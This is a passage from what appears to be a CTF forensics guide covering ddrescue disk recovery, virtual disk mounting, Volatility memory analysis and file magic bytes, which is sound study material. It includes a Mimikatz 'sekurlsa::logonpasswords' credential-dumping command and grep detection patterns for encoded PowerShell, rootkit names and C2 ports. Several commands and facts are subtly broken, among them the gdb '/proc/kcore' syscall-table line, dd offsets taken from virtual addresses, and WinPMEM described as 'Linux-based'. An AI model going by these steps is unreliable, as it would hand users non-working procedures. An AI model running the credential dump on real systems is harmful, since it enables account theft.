apt-get install gddrescue

# Rescue with log file (resumable)
ddrescue -f -n /dev/sdX disk.raw rescue.log

# Options:
# -f: Force (overwrite output)
# -n: No-scrape (skip failing sectors initially)
# -d: Direct disc access
# -r3: Retry bad sectors 3 times
```

**Three-pass approach:**

```bash
# Pass 1: Copy good sectors quickly
ddrescue -f -n /dev/sdX disk.raw rescue.log

# Pass 2: Retry bad sectors
ddrescue -f -d -r3 /dev/sdX disk.raw rescue.log

# Pass 3: Aggressive retry with smaller block size
ddrescue -f -d -r3 -b 512 /dev/sdX disk.raw rescue.log
```

### Mapfile Analysis

**Interpreting ddrescue mapfiles:**

```bash
cat rescue.log
# Format: position size status
# Status codes:
# ?: Non-tried
# -: Failed
# +: Finished
# /: Splitting
# *: Trimming
```

### Working with Incomplete Images

**Mounting despite bad sectors:**

```bash
# Mount with errors=remount-ro
mount -o ro,errors=remount-ro,loop disk.raw /mnt/analysis

# Or errors=continue
mount -o ro,errors=continue,loop disk.raw /mnt/analysis
```

**Identifying readable regions:**

```bash
# Use ddrescue mapfile to identify good sectors
# Extract only recovered data
dd if=disk.raw of=recovered.raw bs=512 skip=X count=Y
```

## Virtual Disk Formats

Virtual machine disk images require conversion or specific tools for analysis.

### VMDK (VMware Virtual Disk)

**Types:**

- Monolithic sparse: Single file, grows dynamically
- Monolithic flat: Single file, pre-allocated
- Split sparse: Multiple 2GB files
- Split flat: Multiple 2GB pre-allocated files

**Mounting VMDK:**

```bash
# Method 1: Using qemu-nbd
apt-get install qemu-utils
modprobe nbd max_part=8

qemu-nbd -r -c /dev/nbd0 image.vmdk
partprobe /dev/nbd0
mount -o ro /dev/nbd0p1 /mnt/vmdk

# Cleanup
umount /mnt/vmdk
qemu-nbd -d /dev/nbd0

# Method 2: Using vmware-mount (if available)
vmware-mount image.vmdk /mnt/vmdk
```

**Converting VMDK:**

```bash
# VMDK to raw
qemu-img convert -f vmdk -O raw image.vmdk output.raw

# Check VMDK info
qemu-img info image.vmdk
```

### VHD (Virtual Hard Disk)

VHD format used by Microsoft Virtual PC and Hyper-V (Generation 1).

**Types:**

- Fixed: Pre-allocated, full size
- Dynamic: Grows as data written
- Differencing: Stores changes relative to parent

**Mounting VHD:**

```bash
# Method 1: Using qemu-nbd
qemu-nbd -r -c /dev/nbd0 image.vhd
mount -o ro /dev/nbd0p1 /mnt/vhd

# Method 2: Using libguestfs
apt-get install libguestfs-tools
guestmount -a image.vhd -m /dev/sda1 --ro /mnt/vhd

# Cleanup
guestunmount /mnt/vhd
```

**Converting VHD:**

```bash
# VHD to raw
qemu-img convert -f vpc -O raw image.vhd output.raw

# VHD info
qemu-img info image.vhd
vhd-util query -n image.vhd -v
```

### VHDX (Virtual Hard Disk v2)

VHDX provides larger capacity (64TB), corruption resilience, and improved performance for Hyper-V Generation 2 VMs.

**Improvements over VHD:**

- 64TB maximum size (vs 2TB)
- 4KB logical sectors
- Protection against power failure corruption
- Metadata integrity checksums

**Mounting VHDX:**

```bash
# Using qemu-nbd (requires qemu-utils 2.x+)
qemu-nbd -r -c /dev/nbd0 image.vhdx
mount -o ro /dev/nbd0p1 /mnt/vhdx

# Using libguestfs
guestmount -a image.vhdx -m /dev/sda1 --ro /mnt/vhdx
```

**Converting VHDX:**

```bash
# VHDX to raw
qemu-img convert -f vhdx -O raw image.vhdx output.raw

# VHDX to VHD (for compatibility)
qemu-img convert -f vhdx -O vpc image.vhdx output.vhd
```

### Multi-Format Tools

**qemu-img universal operations:**

```bash
# Display format info
qemu-img info image.[vmdk|vhd|vhdx|qcow2]

# Check image integrity
qemu-img check image.vmdk

# Resize image (create larger copy)
qemu-img resize image.vmdk +10G

# Convert between any formats
qemu-img convert -f [source_format] -O [dest_format] input output
# Supported formats: raw, qcow2, vmdk, vdi, vpc (vhd), vhdx
```

**libguestfs inspection:**

```bash
# List filesystems without mounting
virt-filesystems -a image.vmdk

# Display OS information
virt-inspector -a image.vmdk

# Extract files without mounting
virt-copy-out -a image.vmdk /path/in/vm /local/path
```

### CTF-Specific Considerations

**Common challenges:**

- Hidden partitions in virtual disks
- Snapshots containing deleted data
- Encryption (BitLocker, LUKS)
- Multiple layers of virtualization

**Quick extraction workflow:**

```bash
# 1. Identify format
file image.*
qemu-img info image.*

# 2. Convert to raw for universal tool compatibility
qemu-img convert -f vmdk -O raw image.vmdk image.raw

# 3. Analyze partition structure
mmls image.raw
fdisk -l image.raw

# 4. Mount or carve as needed
mount -o ro,loop,offset=$(($START*512)) image.raw /mnt/analysis
```

**Related topics:** File system analysis (EXT, NTFS, FAT), file carving, memory forensics (analyzing VMEM files), encryption analysis (LUKS, BitLocker recovery)

---

# Memory Forensics

## Memory Dump Acquisition

Acquiring volatile memory is the critical first step in memory forensics. The integrity and completeness of the memory dump directly affect subsequent analysis. Different acquisition methods are appropriate for different scenarios and operating systems.

### Windows Memory Acquisition

**Using DumpIt (GUI-based, minimal dependencies):**

DumpIt is a straightforward acquisition tool that creates a raw memory image of the entire system. It requires administrative privileges and minimal configuration.

```bash
# On Windows (Command Prompt with Administrator privileges):
DumpIt.exe
# Output file: COMPUTERNAME-20250101-120000.raw
```

The tool generates a single raw .raw file containing the complete physical memory and typically a .info file with acquisition metadata (timestamp, memory size, Windows version).

**Using WinPMEM (Linux-based acquisition from Windows):**

WinPMEM is a kernel driver that can be loaded on Windows to acquire memory. It's particularly useful in automation scenarios or when GUI tools are unavailable.

```bash
# On Windows with WinPMEM driver loaded:
winpmem.exe -o memory.raw

# Verify acquisition
dir memory.raw
# Check file size matches system RAM
```

**Using Mimikatz for credential extraction during acquisition:**

[Inference] While Mimikatz is primarily a credential extraction tool, it can be used in conjunction with memory dumps for post-acquisition analysis to identify cached credentials and authentication artifacts.

```bash
# Run Mimikatz before/after memory dump for credential context
mimikatz.exe
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### Linux Memory Acquisition

**Using dd or cat to image /dev/mem or /dev/pmem:**

On Linux systems without specialized tools, raw memory acquisition can be performed using standard utilities. [Unverified] Kernel version and configuration affect the success of these methods.

```bash
# Acquire physical memory using dd (requires root/kernel module)
sudo dd if=/dev/mem of=/tmp/memory.raw bs=4M

# Alternative using LiME (Linux Memory Extractor) - recommended
# First, load the LiME kernel module:
sudo insmod lime.ko "path=/tmp/memory.raw format=raw"

# Monitor acquisition progress
tail -f /tmp/memory.raw
```

**Using LiME for comprehensive Linux memory capture:**

LiME is the standard Linux memory acquisition framework. It captures memory while maintaining minimal system interference.

```bash
# Compile LiME for your kernel version
cd LiME/src
make -C /lib/modules/$(uname -r)/build M=$(pwd)

# Load the kernel module
sudo insmod lime.ko "path=/tmp/memory.raw format=raw"

# Alternative TCP output for direct remote capture
sudo insmod lime.ko "path=tcp://remote_ip:4444 format=raw"

# Acquisition time and completion status
# Monitor system logs:
dmesg | tail -20
```

### Memory Acquisition Tools Comparison

**DumpIt advantages:** Fast, reliable, no dependencies, Windows-native. **Disadvantages:** GUI-only, limited scripting options.

**WinPMEM advantages:** Kernel-level driver, bypasses user-mode restrictions, scriptable. **Disadvantages:** Requires driver installation, more complex deployment.

**LiME advantages:** Standard on Linux, active maintenance, supports remote acquisition, fast. **Disadvantages:** Requires kernel module compilation, root privileges.

For CTF scenarios, choose based on available privileges and time constraints. DumpIt for speed, WinPMEM for driver-based evasion resistance, LiME for Linux systems.

### Memory Dump Verification and Integrity

After acquisition, verify the dump's integrity and completeness:

```bash
# Calculate hash of acquired memory
md5sum /tmp/memory.raw > /tmp/memory_baseline.md5
sha256sum /tmp/memory.raw >> /tmp/memory_baseline.txt

# Verify file size matches expected system RAM
ls -lh /tmp/memory.raw
# Compare to system info: free -h (Linux) or Task Manager (Windows)

# Check for acquisition errors in LiME logs
grep -i "error\|warning" /var/log/syslog

# For .raw files, verify magic bytes or file structure
file /tmp/memory.raw
# Expected output: "data" or similar (raw binary without headers)
```

---

## Volatility Framework Usage

Volatility is the primary memory analysis framework for CTF scenarios. It provides plugins for process analysis, network connection enumeration, DLL inspection, and malware detection.

### Volatility Installation and Profile Selection

Volatility requires the correct memory profile (OS version and architecture) for accurate analysis.

**Installation:**

```bash
# Install Volatility 2.6 (legacy, widely compatible)
git clone https://github.com/volatilityfoundation/volatility.git
cd volatility
python2 -m pip install -r requirements.txt

# Install Volatility 3 (modern, Python 3)
git clone https://github.com/volatilityfoundation/volatility3.git
cd volatility3
python3 -m pip install -r requirements.txt
```

**Determine the correct profile:**

```bash
# Volatility 2.6 - Identify Windows profile
python2 vol.py -f memory.raw imageinfo
# Output shows suggested profiles, e.g., "WinXPSP2x86", "Win7SP1x64"

# Volatility 3 - Profile auto-detection (recommended)
python3 vol.py -f memory.raw windows.info
# Shows OS, kernel version, and architecture

# For Linux memory dumps
python3 vol.py -f memory.raw linux.info
```

**Common Volatility profiles:**

- `WinXPSP2x86` / `WinXPSP3x86`: Windows XP (32-bit)
- `Win7SP1x86` / `Win7SP1x64`: Windows 7 (32/64-bit)
- `Win10x64`: Windows 10 (64-bit)
- `Win2003SP2x86` / `Win2008SP2x64`: Server editions

### Volatility Command Syntax and Common Flags

**Volatility 2.6 (legacy syntax):**

```bash
python2 vol.py -f memory.raw --profile=Win7SP1x64 <plugin_name>
# Flag meanings:
# -f: Input memory dump file
# --profile: OS profile (required for most plugins)
# Additional flags vary by plugin
```

**Volatility 3 (modern syntax):**

```bash
python3 vol.py -f memory.raw windows.<plugin_name>
# Volatility 3 auto-detects profile and uses module paths
# Example: windows.pstree instead of pslist
```

For CTF scenarios, both versions are viable. Volatility 2.6 has broader community-created plugins; Volatility 3 has better performance and Python 3 support.

### Memory Dump Analysis Workflow

1. Acquire memory (DumpIt, WinPMEM, or LiME)
2. Identify profile (imageinfo or windows.info)
3. Run baseline analysis (pslist, netscan, dlllist)
4. Investigate suspicious processes (using process dump and strings analysis)
5. Extract malware samples or configuration data

---

## Process Listing and Analysis

Process analysis identifies running programs, suspicious behavior, and execution context at the time of memory capture.

### Process Enumeration

**List all running processes:**

```bash
# Volatility 2.6
python2 vol.py -f memory.raw --profile=Win7SP1x64 pslist

# Volatility 3
python3 vol.py -f memory.raw windows.pstree

# Output format (Volatility 2.6):
# Offset(V)          Name                    PID   PPID   Thds   Hnds   Sess  Wow64 Start
# 0x7d82a950         svchost.exe             700    648      5    122      0      0 2025-01-15 10:30:00
# 0x7d8aa608         explorer.exe            1024   900      17   486      1      0 2025-01-15 10:35:20
```

Key output fields:

- **Offset**: Virtual address of the Process Environment Block (PEB) or EPROCESS structure
- **Name**: Executable name
- **PID**: Process ID (used for further analysis)
- **PPID**: Parent Process ID (identifies process tree relationships)
- **Thds**: Thread count
- **Hnds**: Handle count
- **Sess**: Session ID (0 = kernel session, 1+ = user session)
- **Wow64**: Indicates 32-bit process running on 64-bit Windows

**Detect hidden/rootkit processes:**

```bash
# Compare process lists (pslist vs psscan)
# pslist: follows Windows linked lists (can be hidden by rootkits)
python2 vol.py -f memory.raw --profile=Win7SP1x64 pslist

# psscan: carves EPROCESS structures from memory (finds hidden processes)
python2 vol.py -f memory.raw --profile=Win7SP1x64 psscan

# Differences indicate hidden processes:
# If psscan finds processes not in pslist, they are likely rootkit-hidden
diff <(pslist | awk '{print $2}') <(psscan | awk '{print $2}') | grep '>'
```

### Process Memory Examination

**Extract process memory to file:**

```bash
# Dump entire process memory space
python2 vol.py -f memory.raw --profile=Win7SP1x64 memdump -p PID -D /tmp/

# Output: process.PID.dmp (contains full memory of the process)

# Search for specific strings within dumped process memory
strings /tmp/process.PID.dmp | grep -i "password\|flag\|secret"
```

**Analyze process strings and potential indicators:**

```bash
# Extract strings from process memory, filtered for interesting patterns
strings /tmp/process.PID.dmp | grep -E "http://|https://|\.exe|cmd\.exe|powershell"

# Volatility built-in command for process strings
python2 vol.py -f memory.raw --profile=Win7SP1x64 strings -p PID | grep -i "password"
```

**Examine parent-child process relationships:**

```bash
# Show full process tree
python2 vol.py -f memory.raw --profile=Win7SP1x64 pstree

# Output format (tree structure):
# . 0x7d82a950:svchost.exe (700)
#   . 0x7d8aa608:explorer.exe (1024)
#     . 0x7d8ba950:notepad.exe (1156)

# Suspicious indicators: cmd.exe or powershell spawned from unexpected parents
```

**Identify process injection and suspicious command lines:**

```bash
# Extract process command line arguments
python2 vol.py -f memory.raw --profile=Win7SP1x64 cmdline

# Output shows full command lines, revealing scripts or malicious arguments:
# explorer.exe (1024): "C:\Windows\explorer.exe"
# svchost.exe (700): "C:\Windows\system32\svchost.exe -k netsvcs"

# Look for PowerShell with encoded payloads or suspicious arguments
cmdline | grep -i "powershell.*-enc\|powershell.*-e"
```

---

## Network Connection Enumeration

Network artifacts reveal malware C2 communication, lateral movement, and data exfiltration.

### Active Network Connections

**List open TCP/UDP connections:**

```bash
# Volatility 2.6 - netscan plugin (works with Windows XP - Windows 10)
python2 vol.py -f memory.raw --profile=Win7SP1x64 netscan

# Output format:
# Offset(V)          Proto LocalAddr           LocalPort RemoteAddr          RemotePort State
# 0x7d82a950         TCPv4 192.168.1.100       54321     203.0.113.50         443        ESTABLISHED

# Volatility 3
python3 vol.py -f memory.raw windows.netscan

# Filter for suspicious connections
netscan | grep -v "LISTEN\|TIME_WAIT\|CLOSE" | grep -v "127.0.0.1"
```

Key connection states:

- **ESTABLISHED**: Active connection
- **LISTEN**: Port listening for connections (typically legitimate)
- **TIME_WAIT**: Closed connection awaiting timeout
- **CLOSE_WAIT**: Remote peer closed connection

**Identify outbound C2 communication:**

```bash
# Look for ESTABLISHED connections to non-standard ports
netscan | grep "ESTABLISHED" | grep -v ":443\|:80\|:53"

# Geolocate remote IPs (external tool required)
netscan | grep "ESTABLISHED" | awk '{print $6}' | sort -u > /tmp/remote_ips.txt
# Use whois, geoip databases, or online services to identify destinations
```

### Network-Attached DLL and Service Analysis

**Identify processes with network capabilities:**

```bash
# Extract network-capable DLLs from processes
python2 vol.py -f memory.raw --profile=Win7SP1x64 dlllist -p PID | grep -i "winsock\|ws2_32\|wininet"

# Check if suspicious processes are using network APIs
# Processes like cmd.exe or notepad.exe using ws2_32.dll indicate injection/hijacking
```

---

## DLL and Handle Analysis

DLLs provide information about loaded libraries, code injection, and suspicious module loading. Handles reveal object access patterns and resource usage.

### DLL Enumeration and Injection Detection

**List loaded DLLs for a process:**

```bash
# Show all DLLs loaded by a specific process
python2 vol.py -f memory.raw --profile=Win7SP1x64 dlllist -p PID

# Output format:
# Base                Size LoadCount Path
# 0x00400000          0x8000     1 C:\Users\Admin\Desktop\notepad.exe
# 0x77000000          0x180000    1 C:\Windows\System32\kernel32.dll
# 0x77200000          0x90000     1 C:\Windows\System32\ntdll.dll

# Extract all loaded DLLs system-wide
python2 vol.py -f memory.raw --profile=Win7SP1x64 dlllist > /tmp/all_dlls.txt
```

**Detect DLL injection:**

Suspicious indicators include:

- DLLs loaded from unusual paths (temp folders, AppData, user directories)
- DLLs with uncommon names or misspellings (e.g., "kernal32.dll" instead of "kernel32.dll")
- DLLs loaded with in-memory only (no file path on disk)

```bash
# Search for suspicious DLL paths
dlllist | grep -iE "temp|appdata|desktop|users|downloads|%temp%"

# Identify in-memory-only DLLs (potential injection)
dlllist | grep "\\x00" | grep -v "System32\|SysWOW64\|Windows"

# Extract specific DLL for analysis
python2 vol.py -f memory.raw --profile=Win7SP1x64 dlldump -p PID -D /tmp/
```

**Examine DLL entry points:**

```bash
# Extract DLL and analyze entry point
objdump -d /tmp/suspicious.dll | head -50

# Use IDA Pro, Ghidra, or radare2 for detailed disassembly
radare2 /tmp/suspicious.dll
# radare2> aa  (analyze all)
# radare2> afl (list functions)
```

### Handle Analysis

**List open handles for a process:**

```bash
# Show all handles (file, registry, event, mutex, etc.) opened by a process
python2 vol.py -f memory.raw --profile=Win7SP1x64 handles -p PID

# Output format:
# Offset(V)          Pid   Handle Value Type          Details
# 0x7d82a950         700   0x4    File         C:\Windows\System32\drivers\etc\hosts
# 0x7d82a950         700   0x8    Key          \REGISTRY\MACHINE\SOFTWARE\Microsoft\Windows

# Show registry handles specifically
handles -p PID | grep "Key"

# Show file handles
handles -p PID | grep "File"
```

**Identify suspicious handle patterns:**

```bash
# Detect processes holding file handles to unusual locations
handles | grep -iE "temp|secret|hidden|flag"

# Find mutexes used by malware (often hardcoded identifiers)
handles | grep "Mutant" | grep -iE "malware|trojan|bot|c2"
```

---

## Registry Extraction from Memory

The Windows registry is partially cached in memory, allowing forensic extraction and analysis of system configuration, user activity, and malware artifacts.

### Registry Hive Extraction

**Extract registry hives from memory:**

```bash
# List available registry hives in memory
python2 vol.py -f memory.raw --profile=Win7SP1x64 hivelist

# Output format:
# Virtual    Physical   Name
# 0x7d82a950 0x00012345 [\Device\HarddiskVolume2\Windows\System32\config\SAM]
# 0x7d8ba950 0x00054321 [\Device\HarddiskVolume2\Windows\System32\config\SYSTEM]
# 0x7d8ca950 0x00065432 [User Registry (\Registry\User\S-1-5-21-...)]

# Extract specific hive to file
python2 vol.py -f memory.raw --profile=Win7SP1x64 dumpregistry -o 0x7d82a950 -D /tmp/
```

**Common registry hives and their locations:**

- **SAM**: Local user accounts and password hashes
- **SYSTEM**: System configuration, driver information, network configuration
- **SOFTWARE**: Installed applications, Windows settings
- **NTUSER.DAT**: User-specific settings, recent files, MRU lists

### Registry Key and Value Analysis

**Query specific registry keys from extracted hives:**

```bash
# Use reglookup or regtools to parse extracted hives
reglookup -r /tmp/SAM

# Search for specific keys (Run keys often contain malware persistence)
reglookup -r /tmp/SOFTWARE | grep -i "\\Run\\"

# Extract Windows Run key (malware persistence mechanism)
# Key path: \Software\Microsoft\Windows\CurrentVersion\Run
reglookup -r /tmp/SOFTWARE | grep "CurrentVersion\\Run"

# Output shows entries like:
# [key] : /Software/Microsoft/Windows/CurrentVersion/Run
# [value] : Malware = "C:\Users\Admin\malware.exe"
```

**Identify malware persistence artifacts:**

```bash
# Check RunOnce key
reglookup -r /tmp/SOFTWARE | grep "RunOnce"

# Check startup folders (also in registry)
reglookup -r /tmp/NTUSER.DAT | grep "shell\|startup"

# Services (in SYSTEM hive)
reglookup -r /tmp/SYSTEM | grep -i "Services" | head -20
```

**Extract user activity from NTUSER.DAT:**

```bash
# User's recent files
reglookup -r /tmp/NTUSER.DAT | grep -i "recentdocs\|mru"

# TypedPaths (manually entered paths in file dialogs)
reglookup -r /tmp/NTUSER.DAT | grep -i "typedpaths"

# Network shares accessed
reglookup -r /tmp/NTUSER.DAT | grep -i "network\|shares"
```

---

## Malware Memory Artifacts

Malware leaves distinctive artifacts in memory: injected code, packed executables, suspicious API calls, and obfuscation markers.

### Detecting Process Injection

**Identify code injection techniques:**

```bash
# Identify injected code by examining process memory layout
python2 vol.py -f memory.raw --profile=Win7SP1x64 vaddump -p PID -D /tmp/

# Analyze Virtual Address Descriptor (VAD) tree for suspicious regions
python2 vol.py -f memory.raw --profile=Win7SP1x64 vadinfo -p PID

# Output shows memory regions:
# VAD node @0x7d82a950 Start:0x00400000 End:0x00407fff Tag:Vad  VadS 0x7d8ba950
# Protection: PAGE_EXECUTE_READWRITE (suspicious)

# Look for PAGE_EXECUTE_READWRITE regions (executable, writable - indicative of code injection)
vadinfo -p PID | grep -i "PAGE_EXECUTE_READWRITE"
```

**Extract injected code:**

```bash
# Dump memory regions with suspicious permissions
# For each suspicious region identified above:
dd if=/tmp/process.PID.dmp of=/tmp/injected_code.bin bs=1 skip=0x00400000 count=0x7fff

# Analyze with disassembler
objdump -D -b binary -m i386 /tmp/injected_code.bin | head -100

# Or use radare2
radare2 /tmp/injected_code.bin
# radare2> aa (analyze all)
# radare2> pdf (print disassembly)
```

### Packed Executable Detection

**Identify packed/encrypted executables:**

```bash
# Entropy analysis (high entropy = likely encrypted/packed)
# Use python-based entropy checker
python3 << 'EOF'
import math

def calculate_entropy(data):
    entropy = 0
    for i in range(256):
        freq = data.count(bytes([i])) / len(data)
        if freq > 0:
            entropy -= freq * math.log2(freq)
    return entropy

with open('/tmp/process.PID.dmp', 'rb') as f:
    data = f.read()
    entropy = calculate_entropy(data)
    print(f"Entropy: {entropy:.2f}")
    # Entropy > 7.0 indicates likely encryption/packing
EOF

# Extract and attempt unpacking with UPX
upx -d /tmp/process.PID.dmp -o /tmp/unpacked.bin 2>/dev/null
```

### Malicious API Call Detection

**Identify suspicious API calls in memory:**

```bash
# Hook detection and API call sequence analysis requires advanced tools
# [Inference] Tools like APIMonitor or custom analysis frameworks can correlate API calls with process behavior

# Search strings for suspicious API names
strings /tmp/process.PID.dmp | grep -iE "VirtualAlloc|VirtualProtect|CreateRemoteThread|WriteProcessMemory|LoadLibrary"

# These APIs are commonly used in process injection and malware code
```

### C2 Configuration Extraction

**Extract hardcoded C2 addresses and configuration data:**

```bash
# Search process memory for IP addresses and domain names
strings /tmp/process.PID.dmp | grep -E "^([0-9]{1,3}\.){3}[0-9]{1,3}$"

# Look for domain names
strings /tmp/process.PID.dmp | grep -E "^[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?(\.[a-zA-Z0-9]([a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?)*$"

# Extract HTTP User-Agent strings (often indicative of malware families)
strings /tmp/process.PID.dmp | grep -i "user-agent:"

# Look for hardcoded ports
strings /tmp/process.PID.dmp | grep -E ":(80|443|8080|4444|6666|9999)"
```

---

## Kernel Module Analysis

Kernel modules provide insights into rootkits, driver-level malware, and system hooks. Analysis requires understanding kernel structures and module loading mechanisms.

### Linux Kernel Module Enumeration

**List loaded kernel modules:**

```bash
# On live Linux system
lsmod | grep -v "^Module"

# From memory dump using Volatility
python3 vol.py -f memory.raw linux.lsmod

# Output format:
# Module Name                Size  Used by
# bridge                    155648  0
# stp                        16384  1 bridge
# llc                        16384  2 bridge,stp
# udf                       114688  0
```

**Detect suspicious or hidden modules:**

```bash
# Compare module lists (similar to hidden process detection)
# lsmod: follows kernel linked lists (can be hidden by rootkits)
# [Inference] Tools like chkrootkit use multiple detection methods to identify hidden modules

python3 vol.py -f memory.raw linux.lsmod > /tmp/lsmod_list.txt

# Check for modules loaded from unusual paths or with suspicious names
grep -iE "rootkit|backdoor|snake|evil|evil.ko" /tmp/lsmod_list.txt
```

### Windows Kernel Module Analysis

**Extract kernel modules (drivers):**

```bash
# List kernel modules for Windows
python2 vol.py -f memory.raw --profile=Win7SP1x64 modules

# Output format:
# Base                Size LoadCount Path
# 0xffffffff80020000  0x380000    1 \SystemRoot\system32\ntoskrnl.exe
# 0xffffffff82000000  0x100000    1 \SystemRoot\system32\drivers\ACPI.sys

# Suspicious indicators: drivers loaded from temp folders or unusual paths
modules | grep -iE "temp|appdata|\\$"
```

**Examine driver code and hooks:**

```bash
# Extract suspicious driver
python2 vol.py -f memory.raw --profile=Win7SP1x64 moddump -b BASE_ADDRESS -D /tmp/

# Analyze driver binary
strings /tmp/suspicious_driver.sys | head -50

# Look for inline hooks or API table modifications
objdump -D /tmp/suspicious_driver.sys | grep -E "call|jmp" | head -20
```

### System Call Hook Detection

**Identify system call table modifications (rootkit detection):**

```bash
# For Linux, examine system call table
# [Unverified] Volatility's Linux plugins for syscall analysis vary by kernel version

# Manual syscall table check (kernel memory analysis)
# Syscall table located in kernel memory; comparison to known baseline shows modifications
gdb -ex "target remote /proc/kcore" -ex "x/20a $1_syscall_table" 2>/dev/null

# For Windows, check SSDT (System Service Dispatch Table) hooks
python2 vol.py -f memory.raw --profile=Win7SP1x64 ssdt

# Output identifies hooked system calls
# SSDT Index: 0x123
#   Addr: 0xffffffff82000000
#   Name: ntoskrnl.exe  (legitimate)
# SSDT Index: 0x456
#   Addr: 0xffffffff85000000
#   Name: suspicious.sys (rootkit driver - non-standard location)
```

### Interrupt Descriptor Table and IDTR Analysis

**Detect IDT hooks (interrupt hijacking):**

```bash
# Extract IDT entries from memory
# IDT located at IDTR register; contains pointers to interrupt handlers

# [Unverified] Detection requires kernel-level tools or custom analysis
# Tools like volatility plugins or specialized rootkit detectors perform this analysis

python2 vol.py -f memory.raw --profile=Win7SP1x64 interrupts

# Suspicious patterns: IDT entries pointing to non-kernel modules or user-mode addresses
```

### Kernel Hook and Memory Protection Analysis

**Detect kernel code modifications:**

```bash
# Page-level protection analysis
python2 vol.py -f memory.raw --profile=Win7SP1x64 kpcr

# Detect write-protected kernel code being modified
# [Inference] Tools analyze page tables and page protection bits to identify suspicious memory modifications

# Manual analysis: check kernel memory for code caves or unusual patterns
strings /tmp/kernel_memory.bin | grep -E "\\x00{16,}" | wc -l
# Large sections of null bytes may indicate padding or replaced code
```

### Rootkit and Bootkits

**Scan for rootkit signatures:**

```bash
# [Inference] Rootkit detection combines multiple methods: hidden module scanning, syscall table analysis, and heuristic detection

python3 vol.py -f memory.raw linux.check_creds
# Identifies credential handling anomalies

python2 vol.py -f memory.raw --profile=Win7SP1x64 malfind
# Scans for suspicious allocated memory regions, often used by rootkits

# Output identifies suspicious memory regions and potential rootkit code:
# Region: 0x7d82a950
#   Suspicious pattern detected
#   Region allocated as PAGE_EXECUTE_READWRITE
```

This comprehensive memory forensics guide provides actionable techniques for CTF scenarios involving volatile memory analysis, malware detection, and system artifact reconstruction.

---

# File Analysis and Metadata

## File Signature Identification (Magic Bytes)

### Understanding File Signatures

File signatures (magic bytes) are byte sequences at predictable offsets that identify file formats, independent of file extensions. Critical for detecting file type mismatches, polyglots, and hidden content.

**Location:**

- Most signatures: First 2-16 bytes
- Some formats: Specific offsets (e.g., ISO 9660 at offset 0x8001)
- Multi-part signatures: Header + internal markers

### Comprehensive Signature Reference

**Archives and Compression:**

```
ZIP:        50 4B 03 04 (PK..)
            50 4B 05 06 (empty archive)
            50 4B 07 08 (spanned archive)
RAR:        52 61 72 21 1A 07 (Rar!..)
            52 61 72 21 1A 07 01 00 (RAR 5.0+)
GZIP:       1F 8B 08
BZIP2:      42 5A 68 (BZh)
7Z:         37 7A BC AF 27 1C
TAR:        75 73 74 61 72 (ustar at offset 0x101)
XZ:         FD 37 7A 58 5A 00
```

**Images:**

```
JPEG:       FF D8 FF E0 (JFIF)
            FF D8 FF E1 (EXIF)
            FF D8 FF E2 (Canon)
            FF D8 FF E8 (SPIFF)
PNG:        89 50 4E 47 0D 0A 1A 0A
GIF87a:     47 49 46 38 37 61
GIF89a:     47 49 46 38 39 61
BMP:        42 4D
TIFF:       49 49 2A 00 (little-endian)
            4D 4D 00 2A (big-endian)
ICO:        00 00 01 00
WebP:       52 49 46 46 ?? ?? ?? ?? 57 45 42 50
PSD:        38 42 50 53
```

**Documents:**

```
PDF:        25 50 44 46 2D (%PDF-)
PostScript: 25 21 50 53 (%!PS)
RTF:        7B 5C 72 74 66 31 ({\rtf1)
MS Office (OLE): D0 CF 11 E0 A1 B1 1A E1
Office 2007+ (ZIP): 50 4B 03 04 (with [Content_Types].xml)
OpenDocument: 50 4B 03 04 (with mimetype at offset 30)
```

**Executables:**

```
PE (EXE/DLL):   4D 5A (MZ)
ELF:            7F 45 4C 46
Mach-O:         FE ED FA CE (32-bit)
                FE ED FA CF (64-bit)
                CE FA ED FE (reverse byte order)
Java Class:     CA FE BA BE
DEX (Android):  64 65 78 0A (dex.)
```

**Media:**

```
MP3 (ID3v2):    49 44 33 (ID3)
MP3 (MPEG):     FF FB or FF F3 or FF F2
MP4/MOV:        00 00 00 ?? 66 74 79 70 (...ftyp)
AVI:            52 49 46 46 ?? ?? ?? ?? 41 56 49 20 (RIFF....AVI )
WAV:            52 49 46 46 ?? ?? ?? ?? 57 41 56 45 (RIFF....WAVE)
FLAC:           66 4C 61 43 (fLaC)
OGG:            4F 67 67 53 (OggS)
MKV:            1A 45 DF A3
```

**Specialized:**

```
SQLite:         53 51 4C 69 74 65 20 66 6F 72 6D 61 74 20 33 00
PCAP:           D4 C3 B2 A1 (microseconds)
                A1 B2 C3 D4 (nanoseconds)
PCAPNG:         0A 0D 0D 0A
ISO 9660:       43 44 30 30 31 (CD001 at offset 0x8001 or 0x8801)
VMDK:           4B 44 4D (KDM)
QEMU:           51 46 49 (QFI)
Bitcoin Core:   F9 BE B4 D9
```

### Identification Tools

**file Command (libmagic)**

bash

```bash
# Basic identification
file document.dat

# MIME type output
file -i document.dat
file --mime-type document.dat

# Brief mode (type only)
file -b document.dat

# Recursive directory scan
file -r /evidence/*

# Custom magic database
file -m custom.magic suspicious.bin

# Detailed examination
file -z compressed.gz  # Look inside compressed files
file -k document.dat   # Don't stop at first match (show all signatures)

# Check specific offset
file -b -k potential_polyglot.bin
```

**xxd/hexdump (Manual Inspection)**

bash

```bash
# First 32 bytes in hex
xxd -l 32 file.bin
hexdump -C -n 32 file.bin

# Specific offset (ISO example at 0x8001)
xxd -s 0x8001 -l 16 disk.iso

# Search for signatures
xxd file.bin | grep "ff d8 ff"

# Multiple offset inspection
dd if=file.bin bs=1 skip=0 count=16 | xxd
dd if=file.bin bs=1 skip=512 count=16 | xxd
```

**TrID (Comprehensive Database)**


```bash
# Install
wget http://mark0.net/download/trid_linux_64.zip
unzip trid_linux_64.zip
wget http://mark0.net/download/triddefs.zip
unzip triddefs.zip

# Identify file
./trid unknown.bin

# Get extension suggestions
./trid -ae unknown.bin

# Verbose output with probabilities
./trid -v unknown.bin
```

**Bulk Analysis Script**

bash

```bash
#!/bin/bash
# Batch file signature verification

for file in "$@"; do
    echo "=== $file ==="
    
    # Get claimed extension
    ext="${file##*.}"
    
    # Get actual type
    actual=$(file -b --mime-type "$file")
    magic_bytes=$(xxd -l 16 -p "$file" | tr -d '\n')
    
    # Compare
    echo "Extension: .$ext"
    echo "Detected:  $actual"
    echo "Magic:     $magic_bytes"
    
    # Flag mismatches
    case "$actual" in
        *"$ext"*)
            echo "Status:    MATCH"
            ;;
        *)
            echo "Status:    MISMATCH - INVESTIGATE"
            ;;
    esac
    echo
done
```

